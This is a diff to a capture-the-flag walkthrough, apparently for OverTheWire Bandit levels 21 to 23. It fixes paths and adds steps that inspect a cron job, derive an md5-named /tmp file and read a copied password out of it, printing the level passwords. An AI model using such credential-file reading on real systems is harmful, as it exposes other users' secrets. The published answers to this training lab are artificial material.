@@ -474,7 +474,7 @@ The level uses cron jobs.
 We first find the jobs running in the directory
 
 ```bash
-ls -la etc/cron.d/
+ls -la /etc/cron.d/
 total 44
 drwxr-xr-x   2 root root  4096 Sep 19 07:10 .
 drwxr-xr-x 121 root root 12288 Sep 20 18:37 ..
@@ -490,7 +490,7 @@ drwxr-xr-x 121 root root 12288 Sep 20 18:37 ..
 There is a cronjob that runs as bandit22 user, we can print its content to learn more:
 
 ```bash
-cat etc/cron.d/cronjob_bandit22
+cat /etc/cron.d/cronjob_bandit22
 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
 * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
 ```
@@ -517,4 +517,55 @@ we can then print out its contents:
 cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
 ```
+## Bandit 22 > 23
 
+This level also has a cronjob running in `/etc/cron.d/`
+
+Therefore following the previous level's steps we can see that there is a cronjob running as user bandit23
+
+```bash
+ls -la /etc/cron.d
+total 44
+drwxr-xr-x   2 root root  4096 Sep 19 07:10 .
+drwxr-xr-x 121 root root 12288 Sep 20 18:37 ..
+-rw-r--r--   1 root root   120 Sep 19 07:08 cronjob_bandit22
+-rw-r--r--   1 root root   122 Sep 19 07:08 cronjob_bandit23
+-rw-r--r--   1 root root   120 Sep 19 07:08 cronjob_bandit24
+-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
+-rwx------   1 root root    52 Sep 19 07:10 otw-tmp-dir
+-rw-r--r--   1 root root   102 Mar 31  2024 .placeholder
+-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
+```
+
+Using `cat` we see a script for bandit23
+
+```bash
+cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+```
+The script runs various commands:
+
+```bash
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+
+According to the script, the target is a file that is created using a set of commands, thus the myname variable can be substituted with `bandit23`:
+
+```bash
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+```
+Using the generated file name one can then obtain the password:
+
+```bash
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+```
